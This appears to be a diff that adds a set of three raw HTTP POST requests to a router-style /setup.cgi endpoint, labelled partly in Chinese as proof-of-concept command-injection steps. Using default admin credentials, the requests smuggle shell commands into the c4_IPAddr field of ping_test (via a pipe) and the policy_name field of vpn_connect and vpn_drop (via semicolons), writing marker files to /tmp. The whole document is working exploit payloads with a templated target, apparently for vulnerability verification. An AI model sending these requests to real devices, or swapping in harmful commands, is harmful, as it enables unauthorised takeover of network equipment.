@@ -1,0 +1,24 @@
+[Step 1] ping_test c4_IPAddr 管道注入（popen）
+POST /setup.cgi HTTP/1.1
+Host: {{target}}
+Authorization: Basic YWRtaW46cGFzc3dvcmQ=
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 126
+
+todo=ping_test&this_file=diag.htm&next_file=diagping.htm&c4_IPAddr=127.0.0.1%7C%2Fbin%2Fecho%20FIND0004-ping%20%3E%2Ftmp%2Ff4a
+[Step 2] vpn_connect policy_name 分号注入
+POST /setup.cgi HTTP/1.1
+Host: {{target}}
+Authorization: Basic YWRtaW46cGFzc3dvcmQ=
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 109
+
+todo=vpn_connect&next_file=index.htm&policy_name=x%3B%2Fbin%2Fecho%20FIND0004-vpnconnect%20%3E%2Ftmp%2Ff4b%3B
+[Step 3] vpn_drop policy_name 分号注入
+POST /setup.cgi HTTP/1.1
+Host: {{target}}
+Authorization: Basic YWRtaW46cGFzc3dvcmQ=
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 103
+
+todo=vpn_drop&next_file=index.htm&policy_name=x%3B%2Fbin%2Fecho%20FIND0004-vpndrop%20%3E%2Ftmp%2Ff4c%3B
